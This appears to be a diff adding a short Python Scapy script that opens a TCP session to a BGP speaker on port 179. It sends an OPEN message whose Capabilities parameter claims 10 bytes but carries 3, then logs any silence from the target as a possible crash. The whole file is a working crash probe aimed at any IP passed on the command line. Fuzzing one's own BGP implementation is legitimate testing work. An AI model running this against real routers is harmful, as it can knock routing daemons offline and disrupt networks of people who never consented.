@@ -1,0 +1,64 @@
+
+from scapy.all import *
+from scapy.contrib.bgp import *
+import random
+import logging
+import time
+
+logging.basicConfig(filename='codex_tlv_fuzz.log', level=logging.INFO, format='%(asctime)s - %(message)s')
+
+def build_malformed_opt_params():
+    # Forge TLV: Type = 2 (Capabilities), Length = 10, but only 2 bytes of actual data
+    malformed_param = bytes([
+        2,   # Parameter Type: Capabilities
+        10,  # Length says 10 bytes
+        1,   # Capability Code (e.g., multiprotocol)
+        1,   # Capability Length
+        1    # Incomplete payload
+        # Missing remaining 5+ bytes!
+    ])
+    return malformed_param
+
+def send_tlv_crash_probe(dst_ip, dst_port=179):
+    ip = IP(dst=dst_ip)
+    src_port = RandShort()
+
+    syn = TCP(sport=src_port, dport=dst_port, flags='S', seq=1000)
+    syn_ack = sr1(ip/syn, timeout=3, verbose=0)
+
+    if not syn_ack or not syn_ack.haslayer(TCP) or syn_ack[TCP].flags != 'SA':
+        print("[!] No SYN-ACK — target may be filtered.")
+        logging.info("No SYN-ACK received.")
+        return
+
+    ack = TCP(sport=src_port, dport=dst_port, flags='A', seq=syn_ack.ack, ack=syn_ack.seq + 1)
+    send(ip/ack, verbose=0)
+
+    # Build BGP OPEN with malformed optional parameter
+    malformed_opt_param = build_malformed_opt_params()
+    open_with_tlv = BGPHeader(type=1)/Raw(load=bytes([
+        4,                # version
+        0xFC, 0x00,       # my_as = 64512
+        0x00, 0x5A,       # hold_time = 90
+        1,2,3,4,          # BGP Identifier (fake)
+        len(malformed_opt_param)  # Total length of optional parameters
+    ]) + malformed_opt_param)
+
+    pkt = ip/TCP(sport=src_port, dport=dst_port, flags='PA', seq=ack.seq, ack=ack.ack)/open_with_tlv
+    print("[+] Sending malformed TLV BGP OPEN packet")
+    logging.info("Sending TLV crash test with malformed optional parameter.")
+
+    response = sr1(pkt, timeout=3, verbose=0)
+    if response:
+        print("[+] Response:", response.summary())
+        logging.info(f"Response: {response.summary()}")
+    else:
+        print("[!] No response — possible silent crash")
+        logging.info("No response — possible daemon failure or filter.")
+
+if __name__ == "__main__":
+    import sys
+    if len(sys.argv) < 2:
+        print("Usage: sudo python3 codex_tlv_fuzz.py <target_ip>")
+        sys.exit(1)
+    send_tlv_crash_probe(sys.argv[1])
